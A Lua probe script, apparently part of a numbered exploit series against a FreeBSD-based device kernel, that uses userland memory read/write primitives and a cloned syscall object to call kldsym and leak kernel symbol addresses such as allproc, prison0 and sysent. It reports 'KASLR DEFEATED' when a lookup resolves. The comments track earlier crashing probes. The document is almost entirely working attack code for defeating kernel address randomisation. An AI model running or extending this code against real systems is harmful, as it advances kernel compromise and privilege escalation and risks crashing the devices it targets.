-- CRASH_CLASS: HIGH
-- PROBE 57e: Hardened direct kldsym(337) — attributed KASLR test
--
-- Context: 57c stages a new direct kldsym(337) attempt on 14.10, and its
-- core design checks out against upstream FreeBSD releng/9.0: 337 is kldsym
-- (syscalls.master), +0x00/+0x08/+0x10/+0x18 matches struct kld_sym_lookup
-- (linker.h), and fileid=0 searches every loaded module (kern_linker.c).
-- The earlier 43b capture is 5 header-only lines and resolves nothing, so
-- fileid=1 vs fileid=0 on 14.10 is still an open question, not a verdict.
--
-- This probe hardens the attempt so its capture is self-attributing:
-- (a) single write_byte string path verified by readback, replacing
--     57c's double-write idiom (dword loop + byte repair, no check);
-- (b) a canary + echo row per call (fileid, cmd, version, first bytes),
--     so a refusal is attributable to its inputs;
-- (c) the full kernel-band check (hi>=0xFFFF8000 AND hi<0xFFFFFFFF),
--     so all-ones sentinels cannot print as KASLR DEFEATED;
-- (d) errno interpretation from errno.h (EPERM=1 ENOENT=2 EFAULT=14
--     EINVAL=22 ENOSYS=78) instead of bare ret numbers;
-- (e) no early break: every symbol runs, so partial kills stay visible.
--
-- CRASH CLASS NOTE: HIGH — kldnext/kldstat are confirmed lethal on 14.10
-- (probes 56k4/56k5). This syscall may share their fate. NOT RUN.

print("=== PROBE 57e: HARDENED kldsym(337) ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = 0
pcall(function() our_pid = to_num(sc_getpid()) end)
print("  PID: " .. our_pid)
print("")

-- Upstream errno table (sys/sys/errno.h, releng/9.0).
local ERRNO = {
    [1] = "EPERM", [2] = "ENOENT", [14] = "EFAULT",
    [22] = "EINVAL", [78] = "ENOSYS",
}
local function errno_name(rv)
    if rv >= 0 then return "rv=" .. rv end
    local e = ERRNO[0 - rv]
    if e then return "rv=" .. rv .. " (" .. e .. ")" end
    return "rv=" .. rv .. " (errno " .. (0 - rv) .. ")"
end

-- Write a NUL-terminated C string, then read it back. Returns the
-- readback-verified byte count, or nil when any byte mismatches.
local function write_str_verified(buf, str)
    for i = 1, #str do
        local ok = pcall(function()
            memory.write_byte(buf + (i - 1), string.byte(str, i))
        end)
        if not ok then return nil end
    end
    local term_ok = pcall(function() memory.write_byte(buf + #str, 0) end)
    if not term_ok then return nil end
    for i = 1, #str do
        local ok, b = pcall(function() return memory.read_byte(buf + (i - 1)) end)
        if not ok or to_num(b) ~= string.byte(str, i) then return nil end
    end
    return #str + 1
end

local sc_kldsym = make_syscall(337)
local KLDSYM_LOOKUP = 1
local LOOKUP_SIZE = 0x20

-- Symbols shared with 57c/43b so captures stay comparable.
local symbols = {
    "prison0",
    "allproc",
    "kernel_pmap",
    "copyout",
    "copyin",
    "sysent",
}

local name_buf = memory.alloc(128)
local lookup_buf = memory.alloc(0x40)

local resolved = 0
local refused = 0
local malformed = 0

local function try_lookup(fileid, sym)
    for off = 0, 0x3C, 4 do safe_wd(lookup_buf + off, 0) end
    local written = write_str_verified(name_buf, sym)
    if not written then
        malformed = malformed + 1
        print(string.format("  [%s fid=%d] STRING WRITE UNVERIFIED — skipped",
            sym, fileid))
        return
    end
    safe_wd(lookup_buf + 0x00, LOOKUP_SIZE)
    safe_wq(lookup_buf + 0x08, uint64(name_buf))

    -- Echo row: attributes the result below to these exact inputs.
    local first = safe_rd(name_buf) or 0
    print(string.format("  [%s fid=%d] echo: cmd=1 version=0x20 sym[0:4]=%08X",
        sym, fileid, first))

    local ok, ret = pcall(function()
        return sc_kldsym(uint64(fileid), uint64(KLDSYM_LOOKUP),
            uint64(lookup_buf))
    end)
    if not ok then
        print(string.format("  [%s fid=%d] PCALL-FAIL (call raised)", sym, fileid))
        return
    end
    local rv = to_num(ret)
    if rv ~= 0 then
        refused = refused + 1
        print(string.format("  [%s fid=%d] refused: %s", sym, fileid,
            errno_name(rv)))
        return
    end
    local symval = safe_rq(lookup_buf + 0x10)
    local symsize = safe_rq(lookup_buf + 0x18)
    local vh, vl = 0, 0
    if symval then vh, vl = get_hi_lo(symval) end
    local sh, sl = 0, 0
    if symsize then sh, sl = get_hi_lo(symsize) end
    if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
        resolved = resolved + 1
        print(string.format("  [%s fid=%d] RESOLVED: 0x%08X_%08X size=0x%08X_%08X *** KASLR DEFEATED ***",
            sym, fileid, vh, vl, sh, sl))
    else
        print(string.format("  [%s fid=%d] ret=0 but value=0x%08X_%08X outside kernel band (sentinel?)",
            sym, fileid, vh, vl))
    end
end

print("[B] fileid=0 (upstream: search every loaded module)")
for _, sym in ipairs(symbols) do
    try_lookup(0, sym)
end
print("[B] COMPLETE")
print("")

print("[C] fileid=1 (43b's order; capture truncated before any result)")
for _, sym in ipairs(symbols) do
    try_lookup(1, sym)
end
print("[C] COMPLETE")
print("")

print(string.format("[D] SUMMARY: resolved=%d refused=%d unverified=%d",
    resolved, refused, malformed))
print("[D] COMPLETE")
print("")
print("=== 57e DONE ===")
